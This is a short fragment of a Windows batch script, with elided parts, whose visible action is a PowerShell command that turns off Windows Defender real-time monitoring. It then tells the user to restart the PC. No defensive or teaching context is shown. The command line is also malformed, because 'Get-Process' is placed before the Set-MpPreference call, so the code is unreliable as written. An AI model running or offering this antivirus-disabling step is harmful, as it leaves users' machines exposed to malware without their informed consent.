...
:_Start
Cls & Mode CON  LINES=11 COLS=60 & Color 0E &Title Created By OSMAN
...
powershell Get-Process Set-MpPreference -DisableRealtimeMonitoring $true
Goto :Reboot
:Reboot
Echo Success! Restart your pc...
